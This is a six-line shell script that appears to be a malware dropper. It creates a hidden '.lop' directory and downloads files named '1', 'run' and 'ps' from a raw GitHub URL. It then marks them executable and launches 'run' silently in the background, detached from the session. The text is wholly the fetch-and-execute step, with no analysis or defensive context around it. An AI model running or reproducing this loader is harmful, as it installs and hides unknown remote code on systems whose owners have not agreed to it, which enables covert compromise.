mkdir .lop
cd .lop
wget https://raw.githubusercontent.com/calebsto/tomcat/master/1
wget https://raw.githubusercontent.com/calebsto/tomcat/master/run
wget https://raw.githubusercontent.com/calebsto/tomcat/master/ps
chmod +x *
./run > /dev/null 2>&1 & disown
